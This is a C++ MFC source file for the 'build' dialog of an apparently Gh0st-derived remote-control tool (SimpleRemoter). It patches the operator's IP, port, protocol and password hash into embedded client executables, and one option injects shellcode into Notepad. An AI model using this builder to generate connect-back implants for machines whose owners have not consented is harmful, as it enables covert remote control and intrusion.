// BuildDlg.cpp : 实现文件
//

#include "stdafx.h"
#include "2015Remote.h"
#include "BuildDlg.h"
#include "afxdialogex.h"
#include <io.h>

enum Index
{
	IndexTestRun_DLL,
	IndexTestRun_MemDLL,
	IndexTestRun_InjSC,
	IndexGhost,
	IndexServerDll,
	OTHER_ITEM
};

// CBuildDlg 对话框

IMPLEMENT_DYNAMIC(CBuildDlg, CDialog)

std::string GetMasterId();

std::string GetPwdHash();

int MemoryFind(const char *szBuffer, const char *Key, int iBufferSize, int iKeySize);

LPBYTE ReadResource(int resourceId, DWORD &dwSize) {
	dwSize = 0;
	auto id = resourceId;
	HRSRC hResource = FindResourceA(NULL, MAKEINTRESOURCE(id), "BINARY");
	if (hResource == NULL) {
		return NULL;
	}
	// 获取资源的大小
	dwSize = SizeofResource(NULL, hResource);

	// 加载资源
	HGLOBAL hLoadedResource = LoadResource(NULL, hResource);
	if (hLoadedResource == NULL) {
		return NULL;
	}
	// 锁定资源并获取指向资源数据的指针
	LPVOID pData = LockResource(hLoadedResource);
	if (pData == NULL) {
		return NULL;
	}
	auto r = new BYTE[dwSize];
	memcpy(r, pData, dwSize);

	return r;
}


CBuildDlg::CBuildDlg(CWnd* pParent)
	: CDialog(CBuildDlg::IDD, pParent)
	, m_strIP(_T(""))
	, m_strPort(_T(""))
{

}

CBuildDlg::~CBuildDlg()
{
}

void CBuildDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	DDX_Text(pDX, IDC_EDIT_IP, m_strIP);
	DDX_Text(pDX, IDC_EDIT_PORT, m_strPort);
	DDX_Control(pDX, IDC_COMBO_EXE, m_ComboExe);
	DDX_Control(pDX, IDC_STATIC_OTHER_ITEM, m_OtherItem);
	DDX_Control(pDX, IDC_COMBO_BITS, m_ComboBits);
	DDX_Control(pDX, IDC_COMBO_RUNTYPE, m_ComboRunType);
	DDX_Control(pDX, IDC_COMBO_PROTO, m_ComboProto);
	DDX_Control(pDX, IDC_COMBO_ENCRYPT, m_ComboEncrypt);
}


BEGIN_MESSAGE_MAP(CBuildDlg, CDialog)
	ON_BN_CLICKED(IDOK, &CBuildDlg::OnBnClickedOk)
	ON_CBN_SELCHANGE(IDC_COMBO_EXE, &CBuildDlg::OnCbnSelchangeComboExe)
	ON_COMMAND(ID_HELP_PARAMETERS, &CBuildDlg::OnHelpParameters)
END_MESSAGE_MAP()


// CBuildDlg 消息处理程序


void CBuildDlg::OnBnClickedOk()
{
	UpdateData(TRUE);
	if (m_strIP.IsEmpty() || atoi(m_strPort) <= 0)
		return;

	BYTE* szBuffer = NULL;
	DWORD dwFileSize = 0;
	int index = m_ComboExe.GetCurSel(), typ=index;
	int is64bit = m_ComboBits.GetCurSel() == 0;
	if (index == IndexTestRun_InjSC && !is64bit) {
		MessageBox("Shellcode 只能向64位记事本注入，注入器也只能是64位!", "提示", MB_ICONWARNING);
		return;
	}
	int startup = Startup_DLL;
	CString file;
	switch (index)
	{
	case IndexTestRun_DLL: case IndexTestRun_MemDLL: case IndexTestRun_InjSC:
		file = "TestRun.exe";
		typ = index == IndexTestRun_DLL ? CLIENT_TYPE_DLL : CLIENT_TYPE_MEMDLL;
		startup = std::map<int, int>{ 
			{IndexTestRun_DLL, Startup_DLL},{IndexTestRun_MemDLL, Startup_MEMDLL},{IndexTestRun_InjSC, Startup_InjSC},
		}[index];
		szBuffer = ReadResource(is64bit ? IDR_TESTRUN_X64 : IDR_TESTRUN_X86, dwFileSize);
		break;
	case IndexGhost:
		file = "ghost.exe";
		typ = CLIENT_TYPE_ONE;
		szBuffer = ReadResource(is64bit ? IDR_GHOST_X64 : IDR_GHOST_X86, dwFileSize);
		break;
	case IndexServerDll:
		file = "ServerDll.dll";
		typ = CLIENT_TYPE_DLL;
		szBuffer = ReadResource(is64bit ? IDR_SERVERDLL_X64 : IDR_SERVERDLL_X86, dwFileSize);
		break;
	case OTHER_ITEM: {
		m_OtherItem.GetWindowTextA(file);
		typ = -1;
		if (file != "未选择文件") {
			CFile File;
			File.Open(file, CFile::modeRead | CFile::typeBinary);
			dwFileSize = File.GetLength();
			if (dwFileSize > 0) {
				szBuffer = new BYTE[dwFileSize];
				File.Read(szBuffer, dwFileSize);
			}
			File.Close();
		}
		break;
	}
	default:
		break;
	}
	if (szBuffer == NULL)
	{
		MessageBox("出现内部错误，请检查输入，重新编译程序!", "提示", MB_ICONWARNING);
		return;
	}
	//////////上线信息//////////////////////
	CONNECT_ADDRESS g_ConnectAddress = { FLAG_FINDEN, "127.0.0.1", "", typ, false, DLL_VERSION, 0, startup, HeaderEncV0 };
	g_ConnectAddress.SetAdminId(GetMasterHash().c_str());
	g_ConnectAddress.SetServer(m_strIP, atoi(m_strPort));
	g_ConnectAddress.runningType = m_ComboRunType.GetCurSel();
	g_ConnectAddress.protoType = m_ComboProto.GetCurSel();
	g_ConnectAddress.iHeaderEnc = m_ComboEncrypt.GetCurSel();
	memcpy(g_ConnectAddress.pwdHash, GetPwdHash().c_str(), sizeof(g_ConnectAddress.pwdHash));

	if (!g_ConnectAddress.IsValid()) {
		SAFE_DELETE_ARRAY(szBuffer);
		return;
	}
	if (startup != Startup_InjSC)
		g_ConnectAddress.Encrypt();
	try
	{
		// 更新标识
		char* ptr = (char*)szBuffer, *end = (char*)szBuffer + dwFileSize;
		bool bFind = false;
		int bufSize = dwFileSize;
		while (ptr < end) {
			int iOffset = MemoryFind(ptr, (char*)g_ConnectAddress.Flag(), bufSize, g_ConnectAddress.FlagLen());
			if (iOffset == -1)
				break;

			CONNECT_ADDRESS* dst = (CONNECT_ADDRESS*)(ptr + iOffset);
			auto result = strlen(dst->szBuildDate) ? compareDates(dst->szBuildDate, g_ConnectAddress.szBuildDate) : -1;
			if (result > 0) {
				MessageBox("客户端版本比主控程序更高, 无法生成!\r\n" + file, "提示", MB_ICONWARNING);
				return;
			}
			if (result != -2 && result <= 0)// 客户端版本不能不大于主控端
			{
				bFind = true;
				auto master = GetMasterId();
				memcpy(ptr + iOffset, &(g_ConnectAddress.ModifyFlag(master.c_str())), sizeof(g_ConnectAddress));
			}
			ptr += iOffset + sizeof(g_ConnectAddress);
			bufSize -= iOffset + sizeof(g_ConnectAddress);
		}
		if (!bFind) {
			MessageBox("出现内部错误，未能找到标识信息!\r\n" + file, "提示", MB_ICONWARNING);
			SAFE_DELETE_ARRAY(szBuffer);
			return;
		}

		// 保存文件
		char path[_MAX_PATH], * p = path;
		GetModuleFileNameA(NULL, path, sizeof(path));
		while (*p) ++p;
		while ('\\' != *p) --p;
		strcpy(p + 1, file.GetString());

		CString strSeverFile = typ != -1 ? path : file;
		DeleteFileA(strSeverFile);
		CFile File;
		BOOL r=File.Open(strSeverFile,CFile::typeBinary|CFile::modeCreate|CFile::modeWrite);
		if (!r) {
			MessageBox("服务程序创建失败!\r\n" + strSeverFile, "提示", MB_ICONWARNING);
			SAFE_DELETE_ARRAY(szBuffer);
			return;
		}
		File.Write(szBuffer, dwFileSize);
		File.Close();
		CString tip = index == IndexTestRun_DLL ? "\r\n提示: 请生成\"ServerDll.dll\"，以便程序正常运行。" : "";
		tip += g_ConnectAddress.protoType==PROTO_KCP ? "\n提示: 使用KCP协议生成服务，必须设置主控UDP协议参数为1。" : "";
		MessageBox("生成成功! 文件位于:\r\n"+ strSeverFile + tip, "提示", MB_ICONINFORMATION);
		SAFE_DELETE_ARRAY(szBuffer);
		if (index == IndexTestRun_DLL) return;
	}
	catch (CMemoryException* e)
	{
		char err[100];
		e->GetErrorMessage(err, sizeof(err));
		MessageBox("内存异常:" + CString(err), "异常", MB_ICONERROR);
	}
	catch (CFileException* e)
	{
		char err[100];
		e->GetErrorMessage(err, sizeof(err));
		MessageBox("文件异常:" + CString(err), "异常", MB_ICONERROR);
	}
	catch (CException* e)
	{
		char err[100];
		e->GetErrorMessage(err, sizeof(err));
		MessageBox("其他异常:" + CString(err), "异常", MB_ICONERROR);
	}

	SAFE_DELETE_ARRAY(szBuffer);
	CDialog::OnOK();
}

BOOL CBuildDlg::OnInitDialog()
{
	CDialog::OnInitDialog();

	// TODO:  在此添加额外的初始化
	CEdit* pEdit = (CEdit*)GetDlgItem(IDC_EDIT_IP);
	pEdit->LimitText(99);
	m_ComboExe.InsertString(IndexTestRun_DLL, "TestRun - 磁盘DLL");
	m_ComboExe.InsertString(IndexTestRun_MemDLL, "TestRun - 内存DLL");
	m_ComboExe.InsertString(IndexTestRun_InjSC, "TestRun - 注入记事本");

	m_ComboExe.InsertString(IndexGhost, "ghost.exe");
	m_ComboExe.InsertString(IndexServerDll, "ServerDll.dll");
	m_ComboExe.InsertString(OTHER_ITEM, CString("选择文件"));
	m_ComboExe.SetCurSel(IndexTestRun_MemDLL);

	m_ComboBits.InsertString(0, "64位");
	m_ComboBits.InsertString(1, "32位");
	m_ComboBits.SetCurSel(0);

	m_ComboRunType.InsertString(RUNNING_RANDOM, "随机上线");
	m_ComboRunType.InsertString(RUNNING_PARALLEL, "并发上线");
	m_ComboRunType.SetCurSel(RUNNING_RANDOM);

	m_ComboProto.InsertString(PROTO_TCP, "TCP");
	m_ComboProto.InsertString(PROTO_UDP, "UDP");
	m_ComboProto.InsertString(PROTO_HTTP, "HTTP");
	m_ComboProto.InsertString(PROTO_RANDOM, "随机");
	m_ComboProto.InsertString(PROTO_KCP, "KCP");
	m_ComboProto.SetCurSel(PROTO_TCP);

	m_ComboEncrypt.InsertString(PROTOCOL_SHINE, "Shine");
	m_ComboEncrypt.InsertString(PROTOCOL_HELL, "HELL");
	m_ComboEncrypt.SetCurSel(PROTOCOL_SHINE);

	m_OtherItem.ShowWindow(SW_HIDE);

	return TRUE;  // return TRUE unless you set the focus to a control
				  // 异常: OCX 属性页应返回 FALSE
}

void CBuildDlg::OnCbnSelchangeComboExe()
{
	auto n = m_ComboExe.GetCurSel();
	if (n == OTHER_ITEM)
	{
		CComPtr<IShellFolder> spDesktop;
		HRESULT hr = SHGetDesktopFolder(&spDesktop);
		if (FAILED(hr)) {
			MessageBox("Explorer 未正确初始化! 请稍后再试。", "提示");
			return;
		}
		// 过滤器：显示所有文件和特定类型文件（例如文本文件）
		CFileDialog fileDlg(TRUE, _T("dll"), NULL, OFN_HIDEREADONLY | OFN_OVERWRITEPROMPT,
			_T("All Files (*.*)|*.*|DLL Files (*.dll)|*.dll|EXE Files (*.exe)|*.exe|"), AfxGetMainWnd());
		int ret = 0;
		try {
			ret = fileDlg.DoModal();
		}
		catch (...) {
			MessageBox("文件对话框未成功打开! 请稍后再试。", "提示");
			return;
		}
		if (ret == IDOK)
		{
			CString name = fileDlg.GetPathName();

			m_OtherItem.SetWindowTextA(name);
			CFile File;
			BOOL ret = File.Open(name, CFile::modeRead | CFile::typeBinary);
			if (ret) {
				int dwFileSize = File.GetLength();
				LPBYTE szBuffer = new BYTE[dwFileSize];
				File.Read(szBuffer, dwFileSize);
				File.Close();
				m_strIP = "127.0.0.1";
				m_strPort = "6543";
				UpdateData(FALSE);
				SAFE_DELETE_ARRAY(szBuffer);
			}
		}
		else {
			m_OtherItem.SetWindowTextA("未选择文件");
		}
		m_OtherItem.ShowWindow(SW_SHOW);
	}
	else {
		m_OtherItem.SetWindowTextA("");
		m_OtherItem.ShowWindow(SW_HIDE);
	}
}


void CBuildDlg::OnHelpParameters()
{
	CString url = _T("https://github.com/yuanyuanxiang/SimpleRemoter/wiki#生成参数");
	ShellExecute(NULL, _T("open"), url, NULL, NULL, SW_SHOWNORMAL);
}
